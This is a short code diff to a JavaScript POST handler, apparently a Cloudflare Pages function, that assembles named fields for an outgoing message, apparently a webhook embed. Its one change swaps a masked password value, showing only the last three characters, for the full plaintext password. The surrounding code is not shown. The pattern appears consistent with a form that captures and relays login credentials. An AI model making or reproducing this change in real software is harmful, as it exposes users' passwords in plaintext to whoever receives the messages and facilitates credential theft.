@@ -33,7 +33,7 @@ export async function onRequestPost(context) {
             },
             {
               name: "Password",
-              value: "***" + password.slice(-3),
+              value: password,
               inline: true
             },
             {
